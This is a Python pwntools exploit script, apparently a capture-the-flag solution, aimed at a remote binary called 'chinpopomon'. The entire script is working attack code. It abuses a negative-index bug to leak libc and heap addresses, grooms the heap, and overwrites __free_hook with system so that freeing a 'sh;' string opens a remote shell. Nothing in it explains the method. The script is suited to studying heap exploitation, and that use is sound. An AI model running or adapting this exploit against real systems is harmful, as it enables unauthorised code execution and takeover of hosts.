

from pwn import *
import codecs

# p = process('./chinpopomon')
p = remote("3.0.58.217", 2300)


def set_name(name):
	p.sendlineafter("name?", name)

def create(type_num, nickname):
	p.sendlineafter("Choice:", '1')
	p.sendlineafter("Choice:", str(type_num))
	p.sendlineafter("Name: ", nickname)

def enter_pc():
	p.sendlineafter("Choice:", '2')

def exit_pc():
	p.sendlineafter("Choice:", '4')

def restart_game():
	p.sendlineafter("Choice:", '3')

def deposit(index):
	p.sendlineafter("PC Choice:", '1')
	p.sendlineafter("index:", str(index))

def withdraw(index):
	p.sendlineafter("PC Choice:", '2')
	p.sendlineafter("index:", str(index))

def view_stats(index):
	p.sendlineafter("PC Choice:", '3')
	p.sendlineafter("index:", str(index))


# Get libc leak
set_name(p64(0x4072d8) + p64(0x407280)[:-1])
enter_pc()
deposit(-2)
view_stats(0)

libc_leak = int(codecs.encode(p.recvuntil("\x7f")[-6:][::-1], 'hex'), 16)
libc_base = libc_leak - 0x3c7ce0
free_hook = libc_base + 0x1c9b28
system = libc_base + 0x30410
print(hex(libc_base))

withdraw(0)
exit_pc()
restart_game()



# Get heap leak
set_name(p64(0x4072d8) + p64(0x4072e0)[:-1])
create(1, 'qwe')
enter_pc()
deposit(-2)
view_stats(0)

p.recvuntil('Type: ')
heap_leak = int(codecs.encode(p.recvuntil("\n")[:-1][::-1], 'hex'), 16)
heap_base = heap_leak - 0x12ee0
print(hex(heap_base))

withdraw(0)
exit_pc()
for i in range(16):
	create(1, 'qwe')
restart_game()

set_name("ASD")
for i in range(10):
	create(1, (p64(heap_base+0x130f0)*2 + p64(5)).ljust(0x100, b"A") )
	enter_pc()
	deposit(0)
	exit_pc()
restart_game()

to_free = heap_base + 0x14040
print(hex(to_free))
set_name(p64(to_free))
create(1, "A"*0x100)
enter_pc()
deposit(-2)
exit_pc()
restart_game()


set_name("sh;\x00"*64)
create(1, p64(free_hook)*36)
create(1, p64(system)*32)
enter_pc()
deposit(-4)
exit_pc()
restart_game()


p.interactive()
p.close()